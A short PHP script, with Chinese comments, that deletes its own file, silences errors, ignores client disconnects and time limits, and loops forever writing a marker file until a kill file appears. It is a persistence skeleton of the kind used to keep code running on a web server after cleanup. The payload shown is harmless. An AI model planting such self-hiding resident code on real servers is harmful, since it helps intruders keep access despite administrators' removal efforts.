<?php
// 删除自己
@unlink($_SERVER['SCRIPT_FILENAME']);
// 禁用错误报告
error_reporting(0); 
// 忽略与用户的断开，用户浏览器断开后继续执行
ignore_user_abort(true);
// 执行不超时
set_time_limit(0); 
// 循环常驻内存
while(true){
    $filenames = scandir(__DIR__);
    foreach($filenames AS $key => $value){
        if($value == 'woshidashabi.txt'){
            return false;
        }
    }
    file_put_contents('dsb.txt','dsb');
    sleep(1);
}